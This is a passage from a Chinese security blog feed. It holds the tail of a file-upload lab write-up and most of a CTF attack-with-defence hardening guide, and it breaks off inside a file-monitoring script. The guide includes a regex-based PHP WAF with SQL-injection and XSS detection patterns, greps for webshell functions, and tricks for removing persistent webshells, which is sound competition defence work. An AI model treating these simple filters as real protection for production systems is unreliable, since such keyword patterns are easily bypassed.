$UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $img_path)) &#123; </div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                $msg = <span class="string">'上传失败！'</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="0x20-总结"><a href="#0x20-总结" class="headerlink" title="0x20 总结"></a>0x20 总结</h3><p>bypass思路–考虑三个地方的特性：代码、容器、操作系统</p><p>危害–getshell、xss(如果文件名被存入数据库的话，可以造成xss)</p><p>PS:upload-labs的GitHub上写的是不是前端验证看速度，我感觉说的不好，应该右键看眼源码就好了，速度这种东西谁说的准呢。</p><p>最后附一张上传漏洞的脑图<br><img src="http://ok44mzy2k.bkt.clouddn.com/fileupload2.png" alt="image"></p><h3 id="0x21-参考"><a href="#0x21-参考" class="headerlink" title="0x21 参考"></a>0x21 参考</h3><p><a href="https://www.cnblogs.com/engeng/articles/5948089.html" target="_blank" rel="external">https://www.cnblogs.com/engeng/articles/5948089.html</a><br><a href="https://paper.tuisec.win/detail/d511228cd560003" target="_blank" rel="external">https://paper.tuisec.win/detail/d511228cd560003</a><br><a href="https://paper.tuisec.win/detail/e5e5fd3a08d8ff7" target="_blank" rel="external">https://paper.tuisec.win/detail/e5e5fd3a08d8ff7</a><br><a href="http://www.freebuf.com/vuls/128846.html" target="_blank" rel="external">http://www.freebuf.com/vuls/128846.html</a><br><a href="http://www.freebuf.com/articles/web/54086.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/54086.html</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>CTF AWD模式攻防Note</title>
      <link href="/2018/05/24/ctf-awd-note/"/>
      <url>/2018/05/24/ctf-awd-note/</url>
      <content type="html"><![CDATA[<h3 id="0x01-AWD模式"><a href="#0x01-AWD模式" class="headerlink" title="0x01 AWD模式"></a>0x01 AWD模式</h3><p>Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。<br>比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。</p><h3 id="0x02-出题思路"><a href="#0x02-出题思路" class="headerlink" title="0x02 出题思路"></a>0x02 出题思路</h3><h4 id="1-题目类型"><a href="#1-题目类型" class="headerlink" title="1:题目类型"></a>1:题目类型</h4><p>  1-出题人自己写的cms，为了恶心然后加个so。</p><p>  2-常见或者不常见的cms。</p><p>  3-一些框架漏洞，比如ph师傅挖的CI这种</p><h4 id="2-代码类型"><a href="#2-代码类型" class="headerlink" title="2:代码类型"></a>2:代码类型</h4><p>目前来说，国内比赛依旧是php居多，当然也会有一些别的，比如py，lua这种。</p><h4 id="3-题目漏洞类型"><a href="#3-题目漏洞类型" class="headerlink" title="3:题目漏洞类型"></a>3:题目漏洞类型</h4><p>  1-sqli居多</p><p>  2-文件包含</p><p>  3-各种rce</p><p>  4-文件上传</p><h4 id="4-出题人思路"><a href="#4-出题人思路" class="headerlink" title="4:出题人思路"></a>4:出题人思路</h4><p>为了不让你们这群赛棍把题秒了，我直接放个未公开cms的0day把，算了，要不我自己加点东西。诶，等等，这样是不是有点难了，再放几个比较简单的洞把，直接在index.php或者web根目录下放个shell?</p><h4 id="5-拿flag方式"><a href="#5-拿flag方式" class="headerlink" title="5:拿flag方式"></a>5:拿flag方式</h4><p>1-是向内网一台机器发送http请求，返回请求中包含flag。</p><p>2-是例如/home目录下放置flag文件。</p><h3 id="0x03-防御技巧"><a href="#0x03-防御技巧" class="headerlink" title="0x03 防御技巧"></a>0x03 防御技巧</h3><p>1.分析流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#在比赛服务器上抓取流量包</span></div><div class="line">sudo tcpdump <span class="_">-s</span> 0 -w flow.pcap port 80</div></pre></td></tr></table></figure><p>使用scp写个脚本实时将流量包拷贝到本地用wireshark进行分析</p><p>2.分析日志</p><p>1).<a href="https://github.com/wupco/weblogger" target="_blank" rel="external">weblogger</a></p><p>2).<a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="external">LogForensics 腾讯实验室</a></p><p>3).<a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="external">北风飘然@金乌网络安全实验室</a></p><p>4).<a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="external">网络ID为piaox的安全从业人员</a></p><p>5).<a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="external">网络ID：SecSky</a></p><p>6).<a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="external">网络ID：鬼魅羊羔</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 日志地址</span></div><div class="line">/var/<span class="built_in">log</span>/apache2/</div><div class="line">/usr/<span class="built_in">local</span>/apache2/logs</div><div class="line">/usr/nginx/logs/</div></pre></td></tr></table></figure><p>3.打包源码&amp;备份数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 打包目录</span></div><div class="line">tar -zcvf archive_name.tar.gz directory_to_compress</div><div class="line"><span class="comment"># 解包</span></div><div class="line">tar -zxvf archive_name.tar.gz</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 备份指定的多个数据库</span></div><div class="line">mysqldump -u root -p --databases choose <span class="built_in">test</span> &gt; /tmp/db.sql</div><div class="line"><span class="comment"># 恢复备份，在mysql终端下执行：</span></div><div class="line"><span class="comment"># 命令格式：source FILE_PATH</span></div><div class="line"><span class="built_in">source</span> ~/db.sql</div><div class="line"><span class="comment"># 曾经遇到一个备份有问题可以执行下面</span></div><div class="line">mysqldump -u root --all-databases —skip-lock-tables &gt; /tmp/db.sql</div><div class="line"><span class="comment"># 重置mysql密码</span></div><div class="line"><span class="comment"># 方法1：用SET PASSWORD命令  </span></div><div class="line">mysql&gt; <span class="built_in">set</span> password <span class="keyword">for</span> 用户名@localhost = password(<span class="string">'新密码'</span>);</div><div class="line"><span class="comment"># 方法2：用mysqladmin </span></div><div class="line">mysqladmin -u用户名 -p旧密码 password 新密码</div></pre></td></tr></table></figure><p>4.重置ssh密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh登录后执行</span></div><div class="line">passwd</div></pre></td></tr></table></figure><p>5.部署waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//Code By Safe3 </span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr, $errfile, $errline)</span></span></div><div class="line">&#123; </div><div class="line"> <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error number:&lt;/b&gt; [$errno],error on line $errline in $errfile&lt;br /&gt;"</span>;</div><div class="line"> <span class="keyword">die</span>();</div><div class="line">&#125;</div><div class="line">set_error_handler(<span class="string">"customError"</span>,E_ERROR);</div><div class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</div><div class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</div><div class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopAttack</span><span class="params">($StrFiltKey,$StrFiltValue,$ArrFiltReq)</span></span>&#123;  </div><div class="line"></div><div class="line"><span class="keyword">if</span>(is_array($StrFiltValue))</div><div class="line">&#123;</div><div class="line">    $StrFiltValue=implode($StrFiltValue);</div><div class="line">&#125;  </div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrFiltReq.<span class="string">"/is"</span>,$StrFiltValue)==<span class="number">1</span>)&#123;   </div><div class="line">        <span class="comment">//slog("&lt;br&gt;&lt;br&gt;操作IP: ".$_SERVER["REMOTE_ADDR"]."&lt;br&gt;操作时间: ".strftime("%Y-%m-%d %H:%M:%S")."&lt;br&gt;操作页面:".$_SERVER["PHP_SELF"]."&lt;br&gt;提交方式: ".$_SERVER["REQUEST_METHOD"]."&lt;br&gt;提交参数: ".$StrFiltKey."&lt;br&gt;提交数据: ".$StrFiltValue);</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"360websec notice:Illegal operation!"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">&#125;      </div><div class="line">&#125;  </div><div class="line"><span class="comment">//$ArrPGC=array_merge($_GET,$_POST,$_COOKIE);</span></div><div class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    StopAttack($key,$value,$getfilter);</div><div class="line">&#125;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    StopAttack($key,$value,$postfilter);</div><div class="line">&#125;</div><div class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    StopAttack($key,$value,$cookiefilter);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (file_exists(<span class="string">'update360.php'</span>)) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"请重命名文件update360.php，防止黑客利用&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">slog</span><span class="params">($logs)</span></span></div><div class="line">&#123;</div><div class="line">  $toppath=$_SERVER[<span class="string">"DOCUMENT_ROOT"</span>].<span class="string">"/log.htm"</span>;</div><div class="line">  $Ts=fopen($toppath,<span class="string">"a+"</span>);</div><div class="line">  fputs($Ts,$logs.<span class="string">"\r\n"</span>);</div><div class="line">  fclose($Ts);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>使用方法：<br>(1).将waf.php传到要包含的文件的目录<br>(2).在页面中加入防护，有两种做法，根据情况二选一即可：<br>a).在所需要防护的页面加入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">require_once(&apos;waf.php&apos;);</div></pre></td></tr></table></figure><p>就可以做到页面防注入、跨站<br>如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！<br>添加require_once(‘waf.php’);来调用本代码<br>常用php系统添加文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">PHPCMS V9 \phpcms\base.php</div><div class="line">PHPWIND8.7 \data\sql_config.php</div><div class="line">DEDECMS5.7 \data\common.inc.php</div><div class="line">DiscuzX2   \config\config_global.php</div><div class="line">Wordpress   \wp-config.php</div><div class="line">Metinfo   \include\head.php</div></pre></td></tr></table></figure><p>b).在每个文件最前加上代码<br>在php.ini中找到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Automatically add files before or after any PHP document.</div><div class="line">auto_prepend_file = 360_safe3.php路径;</div></pre></td></tr></table></figure><p>需要注意的是，部署waf可能会导致服务不可用，需要谨慎部署。</p><p>如果不能部署waf我们可以简单的写个apache配置文件来禁止PHP执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;Directory &quot;/var/www/html/&quot;&gt;</div><div class="line">Options -ExecCGI -Indexes</div><div class="line">AllowOverride None</div><div class="line">RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</div><div class="line">RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</div><div class="line">php_flag engine off</div><div class="line">&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;</div><div class="line"> deny from all</div><div class="line">&lt;/FilesMatch&gt;</div><div class="line">&lt;/Directory&gt;</div></pre></td></tr></table></figure><p>6.干掉不死马的方式</p><p>(1).<code>ps auxww|grep shell.php</code> 找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了</p><p>(2).重启php等web服务</p><p>(3).用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p><p>(4).创建一个和不死马生成的马一样名字的文件夹。</p><p>7.修改curl命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">alias</span> curl=<span class="string">'echo fuckoff'</span>  <span class="comment">#权限要求较低</span></div><div class="line"><span class="comment"># 或者</span></div><div class="line"><span class="built_in">alias</span> curl=<span class="string">'python -c "__import__(\"sys\").stdout.write(\"flag&#123;%s&#125;\\n\" % (__import__(\"hashlib\").md5(\"\".join([__import__(\"random\").choice(__import__(\"string\").letters) for i in range(0x10)])).hexdigest()))"'</span></div><div class="line">chmod -x curl  <span class="comment">#权限要求较高</span></div><div class="line">/usr/bin  curl路径</div></pre></td></tr></table></figure><p>8.用D盾扫描源代码删除后门文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 简单的查找后门</span></div><div class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'eval('</span></div><div class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'assert('</span></div><div class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'system('</span></div></pre></td></tr></table></figure><p>9.查找常见备份文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 例如bak文件</span></div><div class="line">find / -name <span class="string">"*.bak"</span></div></pre></td></tr></table></figure><p>10.重置web的各种登录密码（如果比赛check认为修改密码算down就不要修改了）</p><p>11.将<code>uploads</code>等文件夹使用<code>chattr</code>对文件底层属性进行控制。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">chattr命令的用法：chattr [ -RVf ] [ -v version ] [ mode ] files…</div><div class="line">最关键的是在[mode]部分，[mode]部分是由+-=和[ASacDdIijsTtu]这些字符组合的，这部分是用来控制文件的</div><div class="line">属性。</div><div class="line"></div><div class="line">+ ：在原有参数设定基础上，追加参数。</div><div class="line">- ：在原有参数设定基础上，移除参数。</div><div class="line">= ：更新为指定参数设定。</div><div class="line">A：文件或目录的 atime (access time)不可被修改(modified), 可以有效预防例如手提电脑磁盘I/O错误的发生。</div><div class="line">S：硬盘I/O同步选项，功能类似sync。</div><div class="line">a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。</div><div class="line">c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作。</div><div class="line">d：即no dump，设定文件不能成为dump程序的备份目标。</div><div class="line">i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。</div><div class="line">j：即journal，设定此参数使得当通过mount参数：data=ordered 或者 data=writeback 挂 载的文件系统，文件在写入时会先被记录(在journal中)。如果filesystem被设定参数为 data=journal，则该参数自动失效。</div><div class="line">s：保密性地删除文件或目录，即硬盘空间被全部收回。</div><div class="line">u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。</div><div class="line">各参数选项中常用到的是a和i。a选项强制只可添加不可删除，多用于日志系统的安全设定。而i是更为严格的安全设定，只有superuser (root) 或具有CAP_LINUX_IMMUTABLE处理能力（标识）的进程能够施加该选项。</div><div class="line"></div><div class="line">应用举例：</div><div class="line"></div><div class="line">用chattr命令防止系统中某个关键文件被修改：</div><div class="line"><span class="comment"># chattr +i /etc/resolv.conf</span></div></pre></td></tr></table></figure><p>12.部署文件监控，如果发现新上传文件或者文件被修改立即恢复</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Author: Nearg1e -- 2016-06-30 10:08:35 --0v0--</span></div><div class="line"><span class="comment"># v demo 0.21 修改了备份的webshell会自己坑自己的情况</span></div><div class="line"><span class="comment"># todo: windows下不支持中文目录</span></div><div class="line"><span class="comment">#use: python file_check.py ./</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> shutil</div><div class="line"><span class="keyword">import</span> ntpath</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line">CWD = os.getcwd()</div><div class="line">FILE_MD5_DICT = &#123;&#125;      <span class="comment"># 文件MD5字典</span></div><div class="line">ORIGIN_FILE_LIST = []</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 特殊文件路径字符串</span></div><div class="line">Special_path_str = <span class="string">'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'</span></div><div class="line">bakstring = <span class="string">'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'</span></div><div class="line">logstring = <span class="string">'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></div><div class="line">webshellstring = <span class="string">'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></div><div class="line">difffile = <span class="string">'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'</span></div><div class="line"></div><div class="line">Special_string = <span class="string">'drops_log'</span>  <span class="comment"># 免死金牌</span></div><div class="line">UNICODE_ENCODING = <span class="string">"utf-8"</span></div><div class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r"\?%02x"</span></div><div class="line"></div><div class="line"><span class="comment"># 文件路径字典</span></div><div class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</div><div class="line">Special_path = &#123;</div><div class="line">    <span class="string">'bak'</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</div><div class="line">    <span class="string">'log'</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</div><div class="line">    <span class="string">'webshell'</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</div><div class="line">    <span class="string">'difffile'</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">isListLike</span><span class="params">(value)</span>:</span></div><div class="line">    <span class="keyword">return</span> isinstance(value, (list, tuple, set))</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 获取Unicode编码</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUnicode</span><span class="params">(value, encoding=None, noneToNull=False)</span>:</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> noneToNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> NULL</div><div class="line"></div><div class="line">    <span class="keyword">if</span> isListLike(value):</div><div class="line">        value = list(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</div><div class="line">        <span class="keyword">return</span> value</div><div class="line"></div><div class="line">    <span class="keyword">if</span> isinstance(value, unicode):</div><div class="line">        <span class="keyword">return</span> value</div><div class="line">    <span class="keyword">elif</span> isinstance(value, basestring):</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</div><div class="line">            <span class="keyword">except</span> UnicodeDecodeError, ex:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    <span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</div><div class="line">                <span class="keyword">except</span>:</div><div class="line">                    value = value[:ex.start] + <span class="string">""</span>.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">return</span> unicode(value)</div><div class="line">        <span class="keyword">except</span> UnicodeDecodeError:</div><div class="line">            <span class="keyword">return</span> unicode(str(value), errors=<span class="string">"ignore"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 目录创建</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir_p</span><span class="params">(path)</span>:</span></div><div class="line">    <span class="keyword">import</span> errno</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        os.makedirs(path)</div><div class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</div><div class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</div><div class="line">            <span class="keyword">pass</span></div><div class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 获取当前所有文件路径</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilelist</span><span class="params">(cwd)</span>:</span></div><div class="line">    filelist = []</div><div class="line">    <span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</div><div class="line">        <span class="keyword">for</span> filepath <span class="keyword">in</span> files:</div><div class="line">            originalfile = os.path.join(root, filepath)</div><div class="line">            <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</div><div class="line">                filelist.append(originalfile)</div><div class="line">    <span class="keyword">return</span> filelist</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 计算机文件MD5值</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcMD5</span><span class="params">(filepath)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">with</span> open(filepath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">            md5obj = hashlib.md5()</div><div class="line">            md5obj.update(f.read())</div><div class="line">            hash = md5obj.hexdigest()</div><div class="line">            <span class="keyword">return</span> hash</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">print</span> <span class="string">u'[!] getmd5_error : '</span> + getUnicode(filepath)</div><div class="line">        <span class="keyword">print</span> getUnicode(e)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            ORIGIN_FILE_LIST.remove(filepath)</div><div class="line">            FILE_MD5_DICT.pop(filepath, <span class="keyword">None</span>)</div><div class="line">        <span class="keyword">except</span> KeyError, e:</div><div class="line">            <span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 获取所有文件MD5</span></div><div class="line"><span 